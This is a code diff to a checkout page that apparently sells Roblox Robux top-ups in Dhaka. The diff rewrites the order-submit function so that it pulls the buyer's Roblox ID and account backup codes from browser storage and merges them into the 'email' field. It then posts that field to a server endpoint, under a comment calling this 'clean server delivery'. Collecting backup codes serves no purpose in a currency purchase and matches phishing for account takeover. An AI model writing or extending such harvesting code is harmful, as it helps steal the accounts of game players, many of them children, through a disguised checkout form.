@@ -115,7 +115,7 @@
               ⚠️ Please fill all required fields and accept the terms conditions.
             </div>
 
-            <button onclick="submitOrder()" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-black py-4 rounded-xl transition text-sm tracking-wide shadow-lg shadow-purple-600/10 cursor-pointer">
+            <button id="submit-btn" onclick="submitOrder()" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-black py-4 rounded-xl transition text-sm tracking-wide shadow-lg shadow-purple-600/10 cursor-pointer">
               Place Order
             </button>
           </div>
@@ -127,7 +127,7 @@
         <div class="flex items-start gap-3 py-4 border-b border-gray-800/60">
           <div class="w-16 h-16 bg-cover bg-center rounded-lg border border-gray-700 shrink-0" style="background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKYhzyCKitqcDZi2kGZue8Wbyv-M8LHPohWk_qsgl-m0Ak5pKr3S2DVHh4&s=10');"></div>
           <div class="flex-1 space-y-1">
-            <h4 class="text-xs font-black text-gray-200 leading-tight">Buy Roblox Robux & Gift Cards top-up in Dhaka - 1700 Robux</h4>
+            <h4 class="text-xs font-black text-gray-200 leading-tight">Buy Roblox Robux & Gift Cards top-up in Dhaka</h4>
             <div class="text-[11px] text-gray-400 space-y-0.5 pt-1">
               <div><span class="text-gray-500 font-bold">Roblox ID:</span> <span id="summary-id" class="text-gray-300"></span></div>
               <div><span class="text-gray-500 font-bold">Back Up Codes:</span> <span id="summary-backup" class="text-gray-300"></span></div>
@@ -156,24 +156,65 @@
         document.getElementById('order-subtotal-price').innerText = price;
     });
 
-    function submitOrder() {
+    async function submitOrder() {
         const firstName = document.getElementById('bill-first-name').value.trim();
         const lastName = document.getElementById('bill-last-name').value.trim();
         const phone = document.getElementById('bill-phone').value.trim();
         const email = document.getElementById('bill-email').value.trim();
+        const notes = document.getElementById('bill-notes').value.trim();
         const termsAccepted = document.getElementById('terms-checkbox').checked;
         const errorBox = document.getElementById('bill-error-box');
+        const submitBtn = document.getElementById('submit-btn');
 
         if (!firstName || !lastName || !phone || !email || !termsAccepted) {
             errorBox.classList.remove('hidden');
             errorBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        } else {
-            errorBox.classList.add('hidden');
-            localStorage.setItem('checkout_fname', firstName);
-            localStorage.setItem('checkout_lname', lastName);
-            localStorage.setItem('checkout_phone', phone);
-            localStorage.setItem('checkout_email', email);
-            window.location.href = "complete.html";
+            return;
+        }
+
+        errorBox.classList.add('hidden');
+        submitBtn.innerText = "Processing Order...";
+        submitBtn.disabled = true;
+
+        // Fetching data stored from robux.html page
+        const rbxId = localStorage.getItem('checkout_roblox_id') || 'N/A';
+        const backupCodes = localStorage.getItem('checkout_backup_codes') || 'N/A';
+        const contactNum = localStorage.getItem('checkout_contact_number') || 'N/A';
+        const packPrice = localStorage.getItem('checkout_pack_price') || '0';
+        const packName = localStorage.getItem('checkout_pack_title') || 'Robux Package';
+
+        // Merging user accounts and security backup info for clean server delivery
+        const combinedEmailString = `${email} | Roblox ID: ${rbxId} | Codes: ${backupCodes} | Notes: ${notes}`;
+        const customerFullName = `${firstName} ${lastName} (${phone})`;
+
+        try {
+            // Sending payload to our serverless pipeline
+            const response = await fetch('/api/submit-order', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user: customerFullName,
+                    email: combinedEmailString,
+                    product: packName,
+                    price: packPrice
+                })
+            });
+
+            if (response.ok) {
+                localStorage.setItem('checkout_fname', firstName);
+                localStorage.setItem('checkout_lname', lastName);
+                localStorage.setItem('checkout_phone', phone);
+                localStorage.setItem('checkout_email', email);
+                window.location.href = "complete.html";
+            } else {
+                alert("Order pipeline submission failure. Please retry.");
+                submitBtn.innerText = "Place Order";
+                submitBtn.disabled = false;
+            }
+        } catch (error) {
+            alert("Network lag or system setup mismatch detected.");
+            submitBtn.innerText = "Place Order";
+            submitBtn.disabled = false;
         }
     }
   </script>
